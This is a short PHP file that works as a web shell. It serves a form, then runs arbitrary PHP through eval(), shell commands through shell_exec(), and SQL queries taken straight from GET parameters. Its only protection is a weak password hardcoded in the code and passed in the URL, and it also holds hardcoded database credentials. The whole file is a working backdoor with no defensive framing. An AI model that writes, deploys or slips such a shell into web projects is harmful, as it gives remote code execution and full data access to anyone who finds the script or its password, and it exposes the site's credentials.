<?php
// Script evaluates arbitrary php or sql or shell code (guarded by password)

if (count($_GET) == 0) {
    echo <<<HERE
<!doctype html>
<html lang="en" data-collapsed="true">
<body>
<style>
textarea {
    width: 500px;
    height: 100px;
}
</style>

<textarea id="read-area"></textarea><br>
<textarea id="password"></textarea><br>
<button onclick="send('php');">Send php!</button><br>
<button onclick="send('cmd');">Send cmd!</button><br>
<button onclick="send('sql');">Send sql!</button><br>
<iframe id="my-iframe"></iframe>

<script>
const send = (method) => {
    let url = encodeURI('__eval__.php?method=' + method + '&data=' + encodeURIComponent(document.getElementById("read-area").value) + '&password=' + document.getElementById("password").value);
    
    document.getElementById('my-iframe').src = url;
}
</script>

</body>
</html>
HERE;
} else {
    echo "<pre>";
    if ($_GET["password"] == "curry1960") {
        if ($_GET["method"] == "php") {
            eval(urldecode($_GET["data"]));
        } else if ($_GET["method"] == "cmd") {
            $command = urldecode($_GET["data"]) . " 2>&1";
            echo shell_exec($command);
        } else if ($_GET["method"] == "sql") {
            mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
            $mysqli = new mysqli('localhost', 'u1242320_jit', 'pass12345', 'u1242320_jitdb');
            $mysqli->set_charset('utf8');
            
            if ($mysqli->connect_errno) {
                echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
            }

            $res = $mysqli->query(urldecode($_GET["data"]));
            if (!$res) {
                echo "Query failed: (" . $mysqli->errno . ") " . $mysqli->error;
            }
            
            for ($row_no = 0; $row_no < $res->num_rows; $row_no++) {
                $res->data_seek($row_no);
                $row = $res->fetch_assoc();
                echo " " . $row_no . ":" . "<br>";
                foreach ($row as $field => $value) {
                    echo "  " . $field . " = " . $value . "<br>";
                }
            }
        }
    } else {
        echo "Access denied";
    }
    echo "</pre>";
    
    // echo htmlspecialchars("[" . $_GET["cmd"] . "]");
    // echo htmlspecialchars("[" . $res . "]");
}
?>